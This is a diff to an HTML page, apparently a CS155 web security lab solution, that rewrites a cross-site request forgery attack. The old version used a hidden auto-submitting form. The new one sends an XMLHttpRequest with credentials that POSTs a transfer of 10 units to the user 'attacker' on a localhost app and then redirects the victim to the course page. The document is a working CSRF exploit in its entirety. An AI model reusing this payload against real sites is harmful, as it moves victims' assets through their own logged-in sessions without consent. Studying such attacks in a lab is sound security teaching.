@@ -2,28 +2,14 @@
   <head>
       <title>B</title>
   </head>
-  <body>
-
-	<form action="http://localhost:3000/post_transfer" method="post" id="attackform" target="iframeholder">
-		<input type="hidden" name="destination_username" value="attacker"/>
-		<input type="hidden" name="quantity" value="10"/>
-  	</form>
-
-	<iframe name="iframeholder" src="" onchange="redirectPage()"></iframe>
-  	
+  <body>  	
   	<script>
-  		function redirectPage() {
-  			if (document.getElementById("iframeholder").innerHTML != "") {
-  				location.href="http://crypto.stanford.edu/cs155/"
-  			}
-
-  		}
-
-  		document.getElementById("attackform").submit()
-  		// request = new XMLHttpRequest()
-  		// request.open('POST','http://localhost:3000/post_transfer', true)
-  		// request.setRequestHeader('Content-type','application/x-www-form-urlencoded')
-  		// request.send("disable_fb=yes&destination_username=attacker&quantity=10")
+  		request = new XMLHttpRequest()
+  		request.open('POST','http://localhost:3000/post_transfer')
+      request.withCredentials = true
+  		request.setRequestHeader('Content-type','application/x-www-form-urlencoded')
+  		request.send("disable_fb=yes&destination_username=attacker&quantity=10")
+      location.href="http://crypto.stanford.edu/cs155/"
 	</script>
   </body>
 </html>
